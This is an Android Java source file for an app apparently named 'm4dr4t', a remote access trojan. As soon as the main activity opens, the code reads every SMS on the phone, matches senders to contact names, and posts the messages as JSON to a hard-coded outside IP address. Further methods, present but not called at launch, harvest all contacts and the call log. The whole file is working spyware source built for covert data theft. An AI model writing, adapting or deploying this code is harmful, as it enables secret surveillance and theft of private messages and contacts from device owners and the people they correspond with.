package example.com.m4dr4t;

import android.app.Activity;
import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.support.v7.app.ActionBarActivity;
import android.os.Bundle;
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;
import android.widget.TextView;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.util.EntityUtils;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.text.DateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;


public class MainActivity extends Activity {

    Context context;
    public TextView outputText;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        context = getApplicationContext();
        outputText = (TextView) findViewById(R.id.textView1);

        /*try {
            fetchContacts();
        } catch (JSONException e) {
            e.printStackTrace();
        }*/
        try {
            getsms();
        } catch (JSONException e) {
            e.printStackTrace();
        }

//        getCallDetails(context);
//        testing();

    }

    public void getsms() throws JSONException{
        Uri uriSMSURI = Uri.parse("content://sms/");
        Cursor cur = getContentResolver().query(uriSMSURI, null, null, null, null);
        JSONObject parent = new JSONObject();
        JSONArray messages = new JSONArray();
        while (cur.moveToNext()) {
            JSONObject details = new JSONObject();
            String address = cur.getString(cur.getColumnIndex("address"));
            String name = getContactName(getApplicationContext(), address);
            String body = cur.getString(cur.getColumnIndexOrThrow("body"));
            String inttype = cur.getString(cur.getColumnIndexOrThrow("type"));

            if(name == null)
                details.put("Name", address);
            else
                details.put("Name", name);

            details.put("Message", body);
            if (inttype.equalsIgnoreCase("1")) {
                String type = "INCOMING";
                details.put("Type", type);
            } else if(inttype.equalsIgnoreCase("2")) {
                String type = "OUTGOING";
                details.put("Type", type);
            }
            messages.put(details);
        }
        parent.put("messages", messages);
        String data = parent.toString();
        AsyncTaskRunner runner = new AsyncTaskRunner();
        runner.execute(data);



    }

    public String getContactName(Context context, String phoneNumber) {
        ContentResolver cr = context.getContentResolver();
        Uri uri = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI,
                Uri.encode(phoneNumber));
        Cursor cursor = cr.query(uri,
                new String[]{ContactsContract.PhoneLookup.DISPLAY_NAME}, null, null, null);
        if (cursor == null) {
            return null;
        }
        String contactName = null;
        if (cursor.moveToFirst()) {
            contactName = cursor.getString(cursor
                    .getColumnIndex(ContactsContract.PhoneLookup.DISPLAY_NAME));
        }
        if (cursor != null && !cursor.isClosed()) {
            cursor.close();
        }
        return contactName;
    }

    public void fetchContacts() throws JSONException {
        StringBuffer output = new StringBuffer();
        JSONObject parent = new JSONObject();
        JSONArray contacts = new JSONArray();

        ContentResolver cr = getContentResolver();
        Cursor cur = getContentResolver().query(ContactsContract.Contacts.CONTENT_URI, null,
                ContactsContract.Contacts.HAS_PHONE_NUMBER + " = 1",
                null,
                "UPPER(" + ContactsContract.Contacts.DISPLAY_NAME + ") ASC");
        if (cur.getCount() > 0) {
            while (cur.moveToNext()) {
                int i = 0;
                JSONObject details = new JSONObject();
                String id = cur.getString(
                        cur.getColumnIndex(ContactsContract.Contacts._ID));
                String name = cur.getString(
                        cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));


                details.put("Name", name);


                if (Integer.parseInt(cur.getString(
                        cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {

                    Cursor pCur = cr.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{id}, null);
                    while (pCur.moveToNext()) {
                        // Do something with phones
                        i++;
                        String phoneNumber = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));

                        details.put("Phone" + i, phoneNumber);

                    }
                    contacts.put(details);
                    pCur.close();

                }


            }
        }
        parent.put("contacts", contacts);
//        outputText.setText(parent.toString());
        String data = parent.toString();
        AsyncTaskRunner runner = new AsyncTaskRunner();
        runner.execute(data);

    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.menu_main, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();

        //noinspection SimplifiableIfStatement
        if (id == R.id.action_settings) {
            return true;
        }

        return super.onOptionsItemSelected(item);
    }

    private void getCallDetails(Context context) {
        int i = 0;
        StringBuffer sb = new StringBuffer();
        Cursor managedCursor = managedQuery(CallLog.Calls.CONTENT_URI, null, null, null, "date DESC");
        int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
        int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
        int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
        int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);
        int name = managedCursor.getColumnIndex(CallLog.Calls.CACHED_NAME);
        sb.append("{\"logs\":[\n");
        while (managedCursor.moveToNext() && i < 30) {
            i++;

            String phNumber = managedCursor.getString(number);
            String callType = managedCursor.getString(type);
            String callDate = managedCursor.getString(date);
            Date callDayTime = new Date(Long.valueOf(callDate));

            String callDuration = managedCursor.getString(duration);
            String person = managedCursor.getString(name);
            String dir = null;
            int dircode = Integer.parseInt(callType);
            switch (dircode) {
                case CallLog.Calls.OUTGOING_TYPE:
                    dir = "OUTGOING";
                    break;

                case CallLog.Calls.INCOMING_TYPE:
                    dir = "INCOMING";
                    break;

                case CallLog.Calls.MISSED_TYPE:
                    dir = "MISSED";
                    break;
            }
//            sb.append("\nPhone Number:--- " + phNumber + " \nCall Type:--- " + dir + " \nCall Date:--- " + callDayTime + " \nCall duration in sec :--- " + callDuration + "\nPerson Name:--- " + person);
//            sb.append("\n----------------------------------");
            if (i < 30) {
                sb.append("   {\n" +
                        "           \"name\": \"" + person + "\",\n" +
                        "           \"number\": \"" + phNumber + "\",\n" +
                        "           \"duration\": \"" + callDuration + "\",\n" +
                        "           \"type\": \"" + dir + "\",\n" +
                        "           \"date\": \"" + callDayTime + "\"\n" +
                        "       },\n");
            } else {
                sb.append("   {\n" +
                        "           \"name\": \"" + person + "\",\n" +
                        "           \"number\": \"" + phNumber + "\",\n" +
                        "           \"duration\": \"" + callDuration + "\",\n" +
                        "           \"type\": \"" + dir + "\",\n" +
                        "           \"date\": \"" + callDayTime + "\"\n" +
                        "       }\n");
            }
        }
        managedCursor.close();
        sb.append("  ]\n" +
                "}");
        String data = sb.toString();
//        call.setText(sb);
//        AsyncTaskRunner runner = new AsyncTaskRunner();
//        runner.execute(data);

    }


    private class AsyncTaskRunner extends AsyncTask<String, String, String> {

        @Override
        protected String doInBackground(String... params) {
            HttpClient httpclient = new DefaultHttpClient();
            HttpPost httppost = new HttpPost(
                    "http://128.199.179.143/groups/api/addMessage");
            String responseBody = null;
            Log.d("Data", params[0]);

            try {
                // Add your data
                List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>();


                nameValuePairs.add(new BasicNameValuePair("Messages", params[0]));


                httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));

                // Execute HTTP Post Request
                HttpResponse response = httpclient.execute(httppost);
                HttpEntity entity = response.getEntity();
                responseBody = EntityUtils.toString(entity);
                Log.i("Response", responseBody);
                // Log.i("Parameters", params[0]);

            } catch (ClientProtocolException e) {

                // TODO Auto-generated catch block
            } catch (IOException e) {


                // TODO Auto-generated catch block
            }
            return responseBody;

        }

        /*
         * (non-Javadoc)
         *
         * @see android.os.AsyncTask#onPostExecute(java.lang.Object)
         */
        @Override
        protected void onPostExecute(String result) {


        }

    }


}
